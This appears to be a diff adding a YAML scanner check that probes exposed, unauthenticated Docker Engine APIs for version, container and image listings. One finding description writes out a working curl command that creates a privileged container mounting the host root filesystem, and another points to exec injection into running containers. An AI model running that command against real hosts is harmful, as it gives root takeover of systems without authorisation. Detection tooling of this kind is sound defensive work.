@@ -1,0 +1,67 @@
+id: docker_api_unauth
+name: "Docker Engine API unauthenticated access"
+description: |
+  Docker daemon bound to 2375 (plain) or 2376 (TLS but no client cert
+  verification) gives full container-escape RCE.  Single curl call
+  creates a privileged container mounting the host root.
+severity_floor: CRITICAL
+tags: [container, no-auth, exposed-service, docker]
+mitre: [T1078, T1611, T1190]
+
+trigger:
+  services:
+    - ports: [2375, 2376, 2377]
+    - banner_contains: ["Docker", "docker/", "Server: Docker"]
+    - service_name_contains: ["docker"]
+
+steps:
+  - name: docker_version
+    tool: curl
+    args:
+      - "-s"
+      - "--max-time"
+      - "10"
+      - "{url}/version"
+    timeout: 15
+    success:
+      stdout_contains: ["\"Version\":", "\"ApiVersion\":"]
+    on_success:
+      finding:
+        title: "Docker Engine API exposed without auth on {host}:{port}"
+        severity: CRITICAL
+        description: "Daemon /version endpoint readable. This is full root on the host: curl -s -XPOST {url}/containers/create -d '{\"Image\":\"alpine\",\"HostConfig\":{\"Privileged\":true,\"Binds\":[\"/:/host\"]}}' -H 'Content-Type: application/json'"
+        cve: ""
+
+  - name: docker_containers
+    tool: curl
+    optional: true
+    args:
+      - "-s"
+      - "--max-time"
+      - "10"
+      - "{url}/containers/json?all=1"
+    timeout: 15
+    success:
+      stdout_contains: ["\"Id\"", "\"Image\""]
+    on_success:
+      finding:
+        title: "Docker container list enumerable on {host}:{port}"
+        severity: HIGH
+        description: "Container list readable. Identify running services + inject into them via /containers/<id>/exec."
+
+  - name: docker_images
+    tool: curl
+    optional: true
+    args:
+      - "-s"
+      - "--max-time"
+      - "10"
+      - "{url}/images/json"
+    timeout: 15
+    success:
+      stdout_contains: ["\"Id\"", "\"RepoTags\""]
+    on_success:
+      finding:
+        title: "Docker image list enumerable on {host}:{port}"
+        severity: MEDIUM
+        description: "Image list leaks the application stack (postgres tag, java version, etc.). Useful for downstream CVE mapping."
